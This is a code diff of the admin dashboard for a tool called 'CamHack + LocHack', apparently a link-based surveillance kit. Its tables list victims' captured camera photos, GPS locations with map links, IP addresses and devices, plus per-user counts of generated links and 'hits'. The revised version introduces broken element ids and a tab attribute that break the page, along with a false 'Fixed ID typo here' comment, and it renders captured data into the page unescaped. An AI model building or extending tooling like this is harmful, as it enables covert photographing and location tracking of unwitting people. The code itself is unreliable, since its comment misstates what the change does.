@@ -1,276 +1,272 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin Panel – CamHack + LocHack</title>
-  <link rel="stylesheet" href="style.css">
-  <style>
-    .admin-header h1 { font-size: 26px; color: var(--gold); }
-    .admin-header .warn { color: var(--red); font-size: 12px; margin-top: 4px; }
-    .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px; margin: 20px 0; }
-    .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 18px; text-align: center; }
-    .stat-card .num { font-size: 30px; font-weight: 900; color: var(--gold); }
-    .stat-card .lbl { font-size: 11px; color: var(--muted); margin-top: 4px; }
-    .admin-tabs { display: flex; gap: 6px; margin: 16px 0; flex-wrap: wrap; }
-    .admin-tab { padding: 8px 16px; border-radius: 25px; cursor: pointer; font-weight: 700; font-size: 13px; background: var(--card2); border: 1px solid var(--border); color: var(--text); transition: .2s; }
-    .admin-tab:hover { border-color: var(--orange); }
-    .admin-tab.active { background: linear-gradient(135deg, var(--orange), var(--orange2)); color: #fff; border-color: transparent; }
-    .admin-panel { display: none; }
-    .admin-panel.active { display: block; }
-    .admin-login { max-width: 360px; margin: 60px auto; }
-    .admin-login h2 { color: var(--gold); text-align: center; margin-bottom: 20px; }
-    .logout-btn { float: right; }
-    .data-table-wrap { overflow-x: auto; }
-    .data-table-wrap table { width: 100%; border-collapse: collapse; font-size: 12px; }
-    .data-table-wrap th { background: var(--card2); color: var(--gold); padding: 10px; text-align: left; border-bottom: 2px solid var(--orange); position: sticky; top: 0; }
-    .data-table-wrap td { padding: 8px 10px; border-bottom: 1px solid var(--border); }
-    .data-table-wrap tr:hover td { background: rgba(255,145,0,.05); }
-    .img-thumb { width: 60px; height: 60px; object-fit: cover; border-radius: 8px; cursor: pointer; }
-    .img-modal { position: fixed; inset: 0; z-index: 999; background: rgba(0,0,0,.9); display: flex; align-items: center; justify-content: center; padding: 20px; cursor: pointer; }
-    .img-modal img { max-width: 90vw; max-height: 90vh; border-radius: 12px; }
-    .btn-delete { background: rgba(239,68,68,.15); color: #ef4444; border: 1px solid rgba(239,68,68,.3); padding: 4px 10px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 700; transition: .2s; }
-    .btn-delete:hover { background: rgba(239,68,68,.3); }
-    .delete-all-btn { margin: 10px 0; }
-    .auth-error { color: #ef4444; text-align: center; margin-bottom: 10px; }
-    .hidden { display: none !important; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - CamHack + LocHack</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .admin-header { text-align: center; padding: 20px; }
+        .admin-header h1 { font-size: 26px; color: var(--gold); }
+        .admin-header .warn { color: var(--red); font-size: 12px; margin-top: 4px; }
+        .admin-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 14px; margin: 20px 0; }
+        .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 18px; text-align: center; }
+        .stat-card .num { font-size: 30px; font-weight: 900; color: var(--gold); }
+        .stat-card .lbl { font-size: 11px; color: var(--muted); margin-top: 4px; }
+        .admin-tabs { display: flex; gap: 6px; margin: 16px 0; flex-wrap: wrap; }
+        .admin-tab { padding: 8px 16px; border-radius: 25px; cursor: pointer; font-weight: 700; font-size: 13px; background: var(--card2); border: 1px solid var(--border); color: var(--text); transition: .2s; }
+        .admin-tab:hover { border-color: var(--orange); }
+        .admin-tab.active { background: linear-gradient(135deg, var(--orange), var(--orange2)); color: #fff; border-color: transparent; }
+        .admin-panel { display: none; }
+        .admin-panel.active { display: block; }
+        .admin-login { max-width: 360px; margin: 60px auto; }
+        .admin-login h2 { color: var(--gold); text-align: center; margin-bottom: 20px; }
+        .logout-btn { float: right; }
+        .data-table-wrap { overflow-x: auto; }
+        .data-table-wrap table { width: 100%; border-collapse: collapse; font-size: 12px; }
+        .data-table-wrap th { background: var(--card2); color: var(--gold); padding: 10px; text-align: left; border-bottom: 2px solid var(--orange); position: sticky; top: 0; }
+        .data-table-wrap td { padding: 8px 10px; border-bottom: 1px solid var(--border); }
+        .data-table-wrap tr:hover td { background: rgba(255,145,0,.05); }
+        .img-thumb { width: 60px; height: 60px; object-fit: cover; border-radius: 8px; cursor: pointer; }
+        .img-modal { position: fixed; inset: 0; z-index: 999; background: rgba(0,0,0,.9); display: flex; align-items: center; justify-content: center; padding: 20px; cursor: pointer; }
+        .img-modal img { max-width: 90vw; max-height: 90vh; border-radius: 12px; }
+        .btn-delete { background: rgba(239,68,68,.15); color: #ef4444; border: 1px solid rgba(239,68,68,.3); padding: 4px 10px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 700; transition: .2s; }
+        .btn-delete:hover { background: rgba(239,68,68,.3); }
+        .delete-all-btn { margin: 10px 0; }
+        .auth-error { color: #ef4444; text-align: center; margin-bottom: 10px; }
+        .hidden { display: none !important; }
+    </style>
 </head>
 <body>
-
-  <div id="admin-login" class="admin-login">
-    <h2>🔐 Admin Panel</h2>
-    <div id="admin-login-error" class="auth-error hidden"></div>
-    <input type="email" id="admin-email" class="input" placeholder="Admin Email">
-    <input type="password" id="admin-pass" class="input" placeholder="Enter Password">
-    <button id="btn-admin-login" class="btn btn-block">Login</button>
-  </div>
-
-  <div id="admin-dashboard" class="hidden" style="max-width:1200px; margin:0 auto; padding:20px;">
-    <div class="admin-header">
-      <h1>🛡️ Admin Control Panel</h1>
-      <p class="warn">⚠️ Authorized personnel only. All activities are logged.</p>
-      <button id="btn-admin-logout" class="btn btn-sm btn-danger logout-btn">🚪 Logout</button>
+    <div id="admin-login" class="admin-login">
+        <h2>🔐 Admin Panel</h2>
+        <div id="admin-login-error" class="auth-error hidden"></div>
+        <input type="email" id="admin-email" class="input" placeholder="Admin Email">
+        <input type="password" id="admin-pass" class="input" placeholder="Enter Password">
+        <button id="btn-admin-login" class="btn btn-block">Login</button>
     </div>
 
-    <div class="admin-stats">
-      <div class="stat-card"><div class="num" id="stat-users">0</div><div class="lbl">Total Users</div></div>
-      <div class="stat-card"><div class="num" id="stat-targets">0</div><div class="lbl">Total Generated Links</div></div>
-      <div class="stat-card"><div class="num" id="stat-captures">0</div><div class="lbl">Total Captures</div></div>
-      <div class="stat-card"><div class="num" id="stat-camera">0</div><div class="lbl">Camera Hits</div></div>
-      <div class="stat-card"><div class="num" id="stat-location">0</div><div class="lbl">Location Hits</div></div>
-      <div class="stat-card"><div class="num" id="stat-ip">0</div><div class="lbl">IP Traces</div></div>
+    <div id="admin-dashboard" class="hidden" style="max-width:1200px; margin:0 auto; padding:20px;">
+        <div class="admin-header">
+            <h1>🛡️ Admin Control Panel</h1>
+            <p class="warn">⚠️ Authorized personnel only. All activities are logged.</p>
+            <button id="btn-admin-logout" class="btn btn-sm btn-danger logout-btn">🚪 Logout</button>
+        </div>
+
+        <div class="admin-stats">
+            <div class="stat-card"><div class="num" id="stat-users">0</div><div class="lbl">Total Users</div></div>
+            <div class="stat-card"><div class="num" id="stat-targets">0</div><div class="lbl">Total Generated Links</div></div>
+            <div class="stat-card"><div class="num" id="-stat-captures">0</div><div class="lbl">Total Captures</div></div>
+            <div class="stat-card"><div class="num" id="stat-camera">0</div><div class="lbl">Camera Hits</div></div>
+            <div class="stat-card"><div class="num" id="stat-location">0</div><div class="lbl">Location Hits</div></div>
+            <div class="stat-card"><div class="num" id="stat-ip">0</div><div class="lbl">IP Traces</div></div>
+        </div>
+
+        <div class="admin-tabs">
+            <button class="admin-tab active" data-atab="users">👥 Users</button>
+            <button class="admin-tab" data-atab="captures">📸 Captures</button>
+            <button class="admin-tab" data-="targets">🎯 Generated Links</button>
+            <button class="admin-tab" data-atab="reviews">⭐ Reviews</button>
+        </div>
+
+        <div id="apanel-users" class="admin-panel active">
+            <div class="data-table-wrap">
+                <table>
+                    <thead><tr><th>#</th><th>Username</th><th>Email</th><th>Reg IP</th><th>Device</th><th>Created</th><th>Links</th></tr></thead>
+                    <tbody id="admin-users-body"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="apanel-captures" class="admin-panel">
+            <button id="btn-delete-all-captures" class="btn btn-sm btn-danger delete-all-btn">🗑️Delete All Captures</button>
+            <div class="data-table-wrap">
+                <table>
+                    <thead><tr><th>Time</th><th>Type</th><th>IP</th><th>Device</th><th>Data</th><th>Actions</th></tr></thead>
+                    <tbody id="admin-captures-body"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="apanel-targets" class="admin-panel">
+            <button id="btn-delete-all-targets" class="btn btn-sm btn-danger delete-all-btn">🗑️ Delete All Targets</button>
+            <div class="data-table-wrap">
+                <table>
+                    <thead><tr><th>Time</th><th>Type</th><th>Status</th><th>Target IP</th><th>Device</th><th>Generated By</th></tr></thead>
+                    <tbody id="admin-targets-body"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="apanel-reviews" class="admin-panel">
+            <div class="data-table-wrap">
+                <table>
+                    <thead><tr><th>Time</th><th>Name</th><th>Review</th></tr></thead>
+                    <tbody id="admin-reviews-body"></tbody>
+                </table>
+            </div>
+        </div>
     </div>
 
-    <div class="admin-tabs">
-      <button class="admin-tab active" data-atab="users">👥 Users</button>
-      <button class="admin-tab" data-atab="captures">📸 Captures</button>
-      <button class="admin-tab" data-atab="targets">🎯 Generated Links</button>
-      <button class="admin-tab" data-atab="reviews">⭐ Reviews</button>
+    <div id="img-modal" class="img-modal hidden" onclick="this.classList.add('hidden')">
+        <img id="img-modal-content" src="">
     </div>
 
-    <div id="apanel-users" class="admin-panel active">
-      <div class="data-table-wrap">
-        <table>
-          <thead><tr><th>#</th><th>Username</th><th>Email</th><th>Reg IP</th><th>Device</th><th>Created</th><th>Links</th></tr></thead>
-          <tbody id="admin-users-body"></tbody>
-        </table>
-      </div>
-    </div>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="firebase-config.js"></script>
+    <script>
+        let adminListeners = [];
 
-    <div id="apanel-captures" class="admin-panel">
-      <button id="btn-delete-all-captures" class="btn btn-sm btn-danger delete-all-btn">🗑️Delete All Captures</button>
-      <div class="data-table-wrap">
-        <table>
-          <thead><tr><th>Time</th><th>Type</th><th>IP</th><th>Device</th><th>Data</th><th>Actions</th></tr></thead>
-          <tbody id="admin-captures-body"></tbody>
-        </table>
-      </div>
-    </div>
+        function showAdminError(msg) {
+            const el = document.getElementById('admin-login-error');
+            if (el) {
+                el.textContent = msg;
+                el.classList.remove('hidden');
+            }
+        }
 
-    <div id="apanel-targets" class="admin-panel">
-      <button id="btn-delete-all-targets" class="btn btn-sm btn-danger delete-all-btn">🗑️ Delete All Targets</button>
-      <div class="data-table-wrap">
-        <table>
-          <thead><tr><th>Time</th><th>Type</th><th>Status</th><th>Target IP</th><th>Device</th><th>Generated By</th></tr></thead>
-          <tbody id="admin-targets-body"></tbody>
-        </table>
-      </div>
-    </div>
-
-    <div id="apanel-reviews" class="admin-panel">
-      <div class="data-table-wrap">
-        <table>
-          <thead><tr><th>Time</th><th>Name</th><th>Review</th></tr></thead>
-          <tbody id="admin-reviews-body"></tbody>
-        </table>
-      </div>
-    </div>
-  </div>
-
-  <div id="img-modal" class="img-modal hidden" onclick="this.classList.add('hidden')">
-    <img id="img-modal-content" src="">
-  </div>
-
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
-  <script src="firebase-config.js"></script>
-
-  <script>
-    let adminListeners = [];
-
-    function showAdminError(msg) {
-      const el = document.getElementById('admin-login-error');
-      if (el) { el.textContent = msg; el.classList.remove('hidden'); }
-    }
-
-    document.getElementById('btn-admin-login').addEventListener('click', () => {
-      const email = document.getElementById('admin-email').value;
-      const pass  = document.getElementById('admin-pass').value;
-      auth.signInWithEmailAndPassword(email, pass)
-        .then(() => {
-          document.getElementById('admin-login').classList.add('hidden');
-          document.getElementById('admin-dashboard').classList.remove('hidden');
-          loadAdminData();
-        })
-        .catch(err => showAdminError('❌ Incorrect password! ' + err.message));
-    });
-
-    document.getElementById('btn-admin-logout').addEventListener('click', () => {
-      auth.signOut();
-      adminListeners.forEach(u => { try { u(); } catch(e) {} });
-      adminListeners = [];
-      document.getElementById('admin-dashboard').classList.add('hidden');
-      document.getElementById('admin-login').classList.remove('hidden');
-    });
-
-    document.querySelectorAll('.admin-tab').forEach(tab => {
-      tab.addEventListener('click', () => {
-        document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
-        tab.classList.add('active');
-        document.querySelectorAll('.admin-panel').forEach(p => p.classList.remove('active'));
-        document.getElementById('apanel-' + tab.dataset.atab).classList.add('active');
-      });
-    });
-
-    async function deleteCapture(docId) {
-      if (!confirm('⚠️ Delete this capture permanently?')) return;
-      try {
-        await db.collection('captures').doc(docId).delete();
-        alert('✅ Capture deleted successfully!');
-      } catch(e) {
-        alert('❌ Error: ' + e.message);
-      }
-    }
-
-    document.getElementById('btn-delete-all-captures').addEventListener('click', async () => {
-      if (!confirm('⚠️ Are you sure you want to DELETE ALL CAPTURES?')) return;
-      if (!confirm('⚠️ FINAL WARNING!')) return;
-      try {
-        const snap = await db.collection('captures').get();
-        const batch = db.batch();
-        snap.forEach(doc => batch.delete(doc.ref));
-        await batch.commit();
-        alert(`✅ ${snap.size} captures deleted successfully!`);
-      } catch(e) { alert('❌ Error: ' + e.message); }
-    });
-
-    document.getElementById('btn-delete-all-targets').addEventListener('click', async () => {
-      if (!confirm('⚠️ Delete ALL generated links?')) return;
-      try {
-        const snap = await db.collection('targets').get();
-        const batch = db.batch();
-        snap.forEach(doc => batch.delete(doc.ref));
-        await batch.commit();
-        alert(`✅ ${snap.size} targets deleted!`);
-      } catch(e) { alert('❌ Error: ' + e.message); }
-    });
-
-    function loadAdminData() {
-      const usersUnsub = db.collection('users').orderBy('createdAt', 'desc').onSnapshot(snap => {
-        const tbody = document.getElementById('admin-users-body');
-        let html = ''; let count = 0;
-        snap.forEach(d => {
-          count++; const u = d.data();
-          html += `<tr><td>${count}</td><td>${u.username || 'N/A'}</td><td>${u.email || 'N/A'}</td><td style="color:#a855f7;">${u.registerIP || u.ip || 'N/A'}</td><td>${u.deviceModel || 'N/A'}</td><td style="font-size:11px;">${u.createdAt ? new Date(u.createdAt.toMillis()).toLocaleString() : 'N/A'}</td><td>${(u.linksGenerated || 0)}</td></tr>`;
+        document.getElementById('btn-admin-login').addEventListener('click', () => {
+            const email = document.getElementById('admin-email').value;
+            const pass = document.getElementById('admin-pass').value;
+            auth.signInWithEmailAndPassword(email, pass)
+                .then(() => {
+                    document.getElementById('admin-login').classList.add('hidden');
+                    document.getElementById('admin-dashboard').classList.remove('hidden');
+                    loadAdminData();
+                })
+                .catch((error) => {
+                    showAdminError('❌ Incorrect password! ' + error.message);
+                });
         });
-        document.getElementById('stat-users').textContent = count;
-        tbody.innerHTML = html || '<tr><td colspan="7" style="text-align:center;padding:20px;color:#8a8aa5;">No users yet.</td></tr>';
-      });
-      adminListeners.push(usersUnsub);
 
-      const capUnsub = db.collection('captures').orderBy('timestamp', 'desc').limit(100).onSnapshot(snap => {
-        const tbody = document.getElementById('admin-captures-body');
-        let html = ''; let camC = 0, locC = 0, ipC = 0, vidC = 0;
-        snap.forEach(d => {
-          const c = d.data(); const type = c.type || 'unknown';
-          if (type === 'camera') camC++; else if (type === 'location') locC++; else if (type === 'ip') ipC++; else if (type === 'video') vidC++;
-
-          let dataDisplay = '';
-          if (type === 'camera') {
-            const imgSrc = c.photoBase64 || c.photoURL || '';
-            dataDisplay = imgSrc ? `<img src="${imgSrc}" class="img-thumb" onclick="document.getElementById('img-modal-content').src='${imgSrc}';document.getElementById('img-modal').classList.remove('hidden');">` : '📷 Photo available';
-          } else if (type === 'location' && c.location) {
-            dataDisplay = `📍 ${c.location.substring(0, 40)}...<br><a href="https://www.google.com/maps?q=${c.latitude},${c.longitude}" target="_blank" style="color:#3b82f6;font-size:11px;">🗺️ View Map</a>`;
-          } else if (type === 'video' && c.videoURL) {
-            dataDisplay = `<video src="${c.videoURL}" controls style="width:100%;border-radius:8px;margin-top:6px;"></video>`;
-          } else {
-            dataDisplay = c.ip || 'N/A';
-          }
-
-          html += `<tr>
-            <td style="font-size:11px;">${c.timestamp ? new Date(c.timestamp.toMillis()).toLocaleString() : 'N/A'}</td>
-            <td>${type.toUpperCase()}</td>
-            <td style="color:#a855f7;">${c.ip || 'N/A'}</td>
-            <td>${c.deviceModel || 'N/A'}</td>
-            <td>${dataDisplay}</td>
-            <td><button class="btn-delete" onclick="deleteCapture('${d.id}')">🗑️ Delete</button></td>
-          </tr>`;
+        document.getElementById('btn-admin-logout').addEventListener('click', () => {
+            auth.signOut();
+            adminListeners.forEach(u => { try { u(); } catch(e) {} });
+            adminListeners = [];
+            document.getElementById('admin-dashboard').classList.add('hidden');
+            document.getElementById('admin-login').classList.remove('hidden');
         });
-        document.getElementById('stat-captures').textContent = snap.size;
-        document.getElementById('stat-camera').textContent = camC;
-        document.getElementById('stat-location').textContent = locC;
-        document.getElementById('stat-ip').textContent = ipC;
-        document.getElementById('stat-video').textContent = vidC;
-        tbody.innerHTML = html || '<tr><td colspan="6" style="text-align:center;padding:20px;color:#8a8aa5;">No captures yet.</td></tr>';
-      });
-      adminListeners.push(capUnsub);
 
-      const tgtUnsub = db.collection('targets').orderBy('createdAt', 'desc').limit(100).onSnapshot(snap => {
-        const tbody = document.getElementById('admin-targets-body');
-        let html = ''; let totalTargets = 0;
-        snap.forEach(d => {
-          totalTargets++; const t = d.data(); const status = t.status || 'pending';
-          html += `<tr>
-            <td style="font-size:11px;">${t.createdAt ? new Date(t.createdAt.toMillis()).toLocaleString() : 'N/A'}</td>
-            <td>${(t.type || 'N/A').toUpperCase()}</td>
-            <td><span style="color:${status==='hit'?'#22c55e':'#ffd54f'};font-weight:700;">${status==='hit'?'✅ HIT':'⏳ PENDING'}</span></td>
-            <td style="color:#a855f7;">${t.ip || 'N/A'}</td>
-            <td>${t.device || 'N/A'}</td>
-            <td style="font-size:11px;">${t.generatedBy ? t.generatedBy.substring(0,8)+'...' : 'N/A'}</td>
-          </tr>`;
+        document.querySelectorAll('.admin-tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+                document.querySelectorAll('.admin-panel').forEach(p => p.classList.remove('active'));
+                document.getElementById('apanel-' + tab.dataset.atab).classList.add('active');
+            });
         });
-        document.getElementById('stat-targets').textContent = totalTargets;
-        tbody.innerHTML = html || '<tr><td colspan="6" style="text-align:center;padding:20px;color:#8a8aa5;">No links generated yet.</td></tr>';
-      });
-      adminListeners.push(tgtUnsub);
 
-      const revUnsub = db.collection('reviews').orderBy('createdAt', 'desc').limit(50).onSnapshot(snap => {
-        const tbody = document.getElementById('admin-reviews-body');
-        let html = '';
-        snap.forEach(d => {
-          const r = d.data();
-          html += `<tr>
-            <td style="font-size:11px;">${r.createdAt ? new Date(r.createdAt.toMillis()).toLocaleString() : 'N/A'}</td>
-            <td style="color:var(--gold);font-weight:600;">${r.name || 'Anonymous'}</td>
-            <td>${r.text || 'N/A'}</td>
-          </tr>`;
+        async function deleteCapture(docId) {
+            if (!confirm('⚠️ Delete this capture permanently?')) return;
+            try {
+                await db.collection('captures').doc(docId).delete();
+                alert('✅ Capture deleted successfully!');
+            } catch (e) {
+                alert('❌ Error: ' + e.message);
+            }
+        }
+
+        document.getElementById('btn-delete-all-captures').addEventListener('click', async () => {
+            if (!confirm('⚠️ Are you sure you want to DELETE ALL CAPTURES?')) return;
+            if (!confirm('⚠️ FINAL WARNING!')) return;
+            try {
+                const snap = await db.collection('captures').get();
+                const batch = db.batch();
+                snap.forEach(doc => batch.delete(doc.ref));
+                await batch.commit();
+                alert(`✅ ${snap.size} captures deleted successfully!`);
+            } catch (e) {
+                alert('❌ Error: ' + e.message);
+            }
         });
-        tbody.innerHTML = html || '<tr><td colspan="3" style="text-align:center;padding:20px;color:#8a8aa5;">No reviews yet.</td></tr>';
-      });
-      adminListeners.push(revUnsub);
-    }
-  </script>
+
+        document.getElementById('btn-delete-all-targets').addEventListener('click', async () => {
+            if (!confirm('⚠️ Delete ALL generated links?')) return;
+            try {
+                const snap = await db.collection('targets').get();
+                const batch = db.batch();
+                snap.forEach(doc => batch.delete(doc.ref));
+                await batch.commit();
+                alert(`✅ ${snap.size} targets deleted!`);
+            } catch (e) {
+                alert('❌ Error: ' + e.message);
+            }
+        });
+
+        function loadAdminData() {
+            const usersUnsub = db.collection('users').orderBy('createdAt', 'desc').onSnapshot(snap => {
+                const tbody = document.getElementById('admin-users-body');
+                let html = '';
+                let count = 0;
+                snap.forEach(d => {
+                    count++;
+                    const u = d.data();
+                    html += `<tr><td>${count}</td><td>${u.username || 'N/A'}</td><td>${u.email || 'N/A'}</td><td style="color:#a855f7;">${u.registerIP || u.ip || 'N/A'}</td><td>${u.deviceModel || 'N/A'}</td><td style="font-size:11px;">${u.createdAt ? new Date(u.createdAt.toMillis()).toLocaleString() : 'N/A'}</td><td>${(u.linksGenerated || 0)}</td></tr>`;
+                });
+                document.getElementById('stat-users').textContent = count;
+                tbody.innerHTML = html || '<tr><td colspan="7" style="text-align:center; padding:20px; color:#8a8aa5;">No users yet.</td></tr>';
+            });
+            adminListeners.push(usersUnsub);
+
+            const capUnsub = db.collection('captures').orderBy('timestamp', 'desc').limit(100).onSnapshot(snap => {
+                const tbody = document.getElementById('admin-captures-body');
+                let html = '';
+                let camC = 0, locC = 0, ipC = 0;
+                snap.forEach(d => {
+                    const c = d.data();
+                    const type = c.type || 'unknown';
+                    if (type === 'camera') camC++;
+                    else if (type === 'location') locC++;
+                    else if (type === 'ip') ipC++;
+
+                    let dataDisplay = '';
+                    if (c.type === 'camera') {
+                        const imgSrc = c.photoBase64 || c.photoURL || '';
+                        dataDisplay = imgSrc ? `<img src="${imgSrc}" class="img-thumb" onclick="document.getElementById('img-modal-content').src='${imgSrc}';document.getElementById('img-modal').classList.remove('hidden');">` : '📷 Photo captured';
+                    } else if (c.type === 'location' && c.location) {
+                        dataDisplay = `📍 ${c.location.substring(0, 40)}...<br><a href="https://www.google.com/maps?q=${c.latitude},${c.longitude}" target="_blank" style="color:#3b82f6;font-size:11px;">🗺️ View Map</a>`;
+                    } else {
+                        dataDisplay = c.ip || 'N/A';
+                    }
+
+                    html += `<tr><td style="font-size:11px;">${c.timestamp ? new Date(c.timestamp.toMillis()).toLocaleString() : 'N/A'}</td><td>${type.toUpperCase()}</td><td style="color:#a855f7;">${c.ip || 'N/A'}</td><td>${c.deviceModel || 'N/A'}</td><td>${dataDisplay}</td><td><button class="btn-delete" onclick="deleteCapture('${d.id}')">🗑️ Delete</button></td></tr>`;
+                });
+                document.getElementById('stat-captures').textContent = snap.size; // Fixed ID typo here
+                document.getElementById('stat-camera').textContent = camC;
+                document.getElementById('stat-location').textContent = locC;
+                document.getElementById('stat-ip').textContent = ipC;
+                tbody.innerHTML = html || '<tr><td colspan="6" style="text-align:center;padding:20px;color:#8a8aa5;">No captures yet.</td></tr>';
+            });
+            adminListeners.push(capUnsub);
+
+            const tgtUnsub = db.collection('targets').orderBy('createdAt', 'desc').limit(100).onSnapshot(snap => {
+                const tbody = document.getElementById('admin-targets-body');
+                let html = '';
+                let totalTargets = 0;
+                snap.forEach(d => {
+                    totalTargets++;
+                    const t = d.data();
+                    const status = t.status || 'pending';
+                    html += `<tr><td style="font-size:11px;">${t.createdAt ? new Date(t.createdAt.toMillis()).toLocaleString() : 'N/A'}</td><td>${(t.type||'N/A').toUpperCase()}</td><td><span style="color:${status==='hit'?'#22c55e':'#ffd54f'};font-weight:700;">${status === 'hit' ? '✅ HIT' : '⏳ PENDING'}</span></td><td style="color:#a855f7;">${t.ip || 'N/A'}</td><td>${t.device || 'N/A'}</td><td style="font-size:11px;">${t.generatedBy ? t.generatedBy.substring(0,8)+'...' : 'N/A'}</td></tr>`;
+                });
+                document.getElementById('stat-targets').textContent = totalTargets;
+                tbody.innerHTML = html || '<tr><td colspan="6" style="text-align:center;padding:20px;color:#8a8aa5;">No links generated yet.</td></tr>';
+            });
+            adminListeners.push(tgtUnsub);
+
+            const revUnsub = db.collection('reviews').orderBy('createdAt', 'desc').limit(50).onSnapshot(snap => {
+                const tbody = document.getElementById('admin-reviews-body');
+                let html = '';
+                snap.forEach(d => {
+                    const r = d.data();
+                    html += `<tr><td style="font-size:11px;">${r.createdAt ? new Date(r.createdAt.toMillis()).toLocaleString() : 'N/A'}</td><td style="color:var(--gold);font-weight:600;">${r.name || 'Anonymous'}</td><td>${r.text || 'N/A'}</td></tr>`;
+                });
+                tbody.innerHTML = html || '<tr><td colspan="3" style="text-align:center;padding:20px;color:#8a8aa5;">No reviews yet.</td></tr>';
+            });
+            adminListeners.push(revUnsub);
+        }
+    </script>
 </body>
 </html>
